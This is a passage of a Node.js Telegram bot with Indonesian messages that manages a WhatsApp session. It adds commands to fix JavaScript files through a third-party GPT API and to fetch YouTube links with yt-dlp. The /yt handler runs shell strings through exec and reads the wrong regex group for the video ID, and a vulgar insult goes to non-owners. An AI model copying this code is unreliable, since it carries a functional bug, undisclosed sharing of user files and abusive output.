    console.error(chalk.red("Gagal melakukan pairing:"), error);
    await ctx.reply("❌ Gagal melakukan pairing !");
  }
});
// case fixcode
bot.command("fixcode", async (ctx) => {
  try {
    const fileMessage = ctx.message.reply_to_message?.document || ctx.message.document;

    if (!fileMessage) {
      return ctx.reply(`📂 Kirim file .js dan reply dengan perintah /fixcode`);
    }

    const fileName = fileMessage.file_name || "unknown.js";
    if (!fileName.endsWith(".js")) {
      return ctx.reply("⚠️ File harus berformat .js bre!");
    }

    const fileUrl = await ctx.telegram.getFileLink(fileMessage.file_id);
    const response = await axios.get(fileUrl.href, { responseType: "arraybuffer" });
    const fileContent = response.data.toString("utf-8");

    await ctx.reply("🤖 Lagi memperbaiki kodenya bre... tunggu bentar!");

    const { data } = await axios.get("https://api.nekolabs.web.id/ai/gpt/4.1", {
      params: {
        text: fileContent,
        systemPrompt: `Kamu adalah seorang programmer ahli JavaScript dan Node.js.
Tugasmu adalah memperbaiki kode yang diberikan agar bisa dijalankan tanpa error, 
namun jangan mengubah struktur, logika, urutan, atau gaya penulisan aslinya.

Fokus pada:
- Menyelesaikan error sintaks (kurung, kurawal, tanda kutip, koma, dll)
- Menjaga fungsi dan struktur kode tetap sama seperti input
- Jangan menghapus komentar, console.log, atau variabel apapun
- Jika ada blok terbuka (seperti if, else, try, atau fungsi), tutup dengan benar
- Jangan ubah nama fungsi, variabel, atau struktur perintah
- Jangan tambahkan penjelasan apapun di luar kode
- Jangan tambahkan markdown javascript Karena file sudah berbentuk file .js
- Hasil akhir harus langsung berupa kode yang siap dijalankan
`,
        sessionId: "neko"
      },
      timeout: 60000,
    });

    if (!data.success || !data.result) {
      return ctx.reply("❌ Gagal memperbaiki kode, coba ulang bre.");
    }

    const fixedCode = data.result;
    const outputPath = `./fixed_${fileName}`;
    fs.writeFileSync(outputPath, fixedCode);

    await ctx.replyWithDocument({ source: outputPath, filename: `fixed_${fileName}` });
  } catch (err) {
    console.error("FixCode Error:", err);
    ctx.reply("⚠️ Terjadi kesalahan waktu memperbaiki kode.");
  }
});

bot.hears(/^\/yt(?:\s+(.+))?$/, async (ctx) => {
  const chatId = ctx.chat.id;
  let url = ctx.match[1];

  if (!url && ctx.message.reply_to_message && ctx.message.reply_to_message.text) {
    const replyText = ctx.message.reply_to_message.text;
    const urlMatch = replyText.match(/(https?:\/\/)?(www\.)?(youtube\.com|youtu\.be)\/[^\s]+/);
    if (urlMatch) url = urlMatch[0];
  }

  if (!url) {
    return ctx.reply("🎬 *YouTube to Video Link*\n\n/yt [url]\nAtau reply link lalu /yt", { parse_mode: 'Markdown' });
  }

  const youtubeRegex = /(https?:\/\/)?(www\.)?(youtube\.com|youtu\.be)\/(watch\?v=|shorts\/|embed\/|v\/)?([a-zA-Z0-9_-]{11})/;
  const matchUrl = url.match(youtubeRegex);
  if (!matchUrl) return ctx.reply("❌ URL YouTube tidak valid!", { parse_mode: 'Markdown' });

  const videoId = matchUrl[4];
  const loading = await ctx.reply("🔄 Mengambil link video...", { parse_mode: 'Markdown' });

  try {
    const { exec } = require('child_process');
    const { promisify } = require('util');
    const execPromise = promisify(exec);
    const cmd = `yt-dlp -g "https://www.youtube.com/watch?v=${videoId}" 2>/dev/null`;
    const { stdout } = await execPromise(cmd);
    const videoUrl = stdout.trim().split('\n')[0];
    await ctx.deleteMessage(loading.message_id);

    if (videoUrl && videoUrl.startsWith('http')) {
      const infoCmd = `yt-dlp -j "https://www.youtube.com/watch?v=${videoId}" 2>/dev/null`;
      const { stdout: infoOut } = await execPromise(infoCmd);
      const info = JSON.parse(infoOut);
      const msgText = `🎬 *${info.title || 'Video'}*\n\n🔗 [DOWNLOAD VIDEO](${videoUrl})\n\n📺 *Channel:* ${info.uploader || 'Unknown'}\n⏱️ *Durasi:* ${info.duration ? Math.floor(info.duration / 60) + ':' + (info.duration % 60).toString().padStart(2, '0') : 'Unknown'}\n👁️ *Views:* ${info.view_count ? info.view_count.toLocaleString() : 'Unknown'}`;
      await ctx.reply(msgText, { parse_mode: 'Markdown', disable_web_page_preview: true });
      const keyboard = {
        inline_keyboard: [
          [{ text: '🎵 MP3', callback_data: `yt_audio:${videoId}` }],
          [{ text: '📝 Info', callback_data: `yt_info:${videoId}` }]
        ]
      };
      await ctx.reply("🔽 Pilih opsi:", { reply_markup: keyboard });
    } else {
      throw new Error('No video url');
    }
  } catch (err) {
    await ctx.deleteMessage(loading.message_id);
    const fallback = `https://www.youtube.com/watch?v=${videoId}`;
    const thumbnail = `https://img.youtube.com/vi/${videoId}/maxresdefault.jpg`;
    await ctx.reply(`⚠️ *Tidak dapat mengambil direct link.*\n\n🔗 [Buka di YouTube](${fallback})\n🖼️ [Thumbnail](${thumbnail})\n\n💡 Gunakan: y2mate.com atau savefrom.net`, { parse_mode: 'Markdown', disable_web_page_preview: true });
  }
});
// Handler untuk tombol close
bot.action("Close", async (ctx) => {
  const userId = ctx.from.id.toString();

  if (!OWNER_IDS.includes(userId)) {
    return ctx.answerCbQuery("Lu Siapa Kontol", { show_alert: true });
  }

  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error(chalk.red("Gagal menghapus pesan:"), error);
    await ctx.answerCbQuery("❌ Gagal menghapus pesan!", { show_alert: true });
  }
});
///=== comand del sesi ===\\\\
bot.command("delsesi", (ctx) => {
  const success = deleteSession();

  if (success) {
    ctx.reply("✅ Session berhasil di hapus, silahkan connect ulang");
  } else {
    ctx.reply("❌ Tidak ada session yang tersimpan saat ini.");
  }
});

////=== Fungsi Delete Session ===\\\\\\\
function deleteSession() {
  if (fs.existsSync(sessionPath)) {
    const stat = fs.statSync(sessionPath);

    if (stat.isDirectory()) {
      fs.readdirSync(sessionPath).forEach(file => {
        fs.unlinkSync(path.join(sessionPath, file));
      });
      fs.rmdirSync(sessionPath);
      console.log('Folder session berhasil dihapus.');
    } else {
      fs.unlinkSync(sessionPath);
      console.log('File session berhasil dihapus.');
    }

    return true;
  } else {
    console.log('Session tidak ditemukan.');
    return false;
  }
}

////////// OWNER MENU \\\\\\\\\
bot.command("Status", checkOwner, checkAdmin, async (ctx) => {
  try {
    const waStatus = sock && sock.user
      ? "Terhubung"
      : "Tidak Terhubung";

    const message = `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃ STATUS WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ STATUS : ${waStatus}
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`;

    await ctx.reply(message, {
      parse_mode: "HTML"
    });

  } catch (error) {
    console.error("Gagal menampilkan status bot:", error);
    ctx.reply("❌ Gagal menampilkan status bot.");
  }
});
/////////////////END/////////////////////////

///////////////////[FUNC]////////////////


// --- Jalankan Bot ---
(async () => {
console.log(chalk.redBright.bold(`
╭─────────────────────────────╮
│${chalk.white('Memulai Sesi WhatsApp..')}
╰─────────────────────────────╯
`));

startSesi();
bot.launch();
})();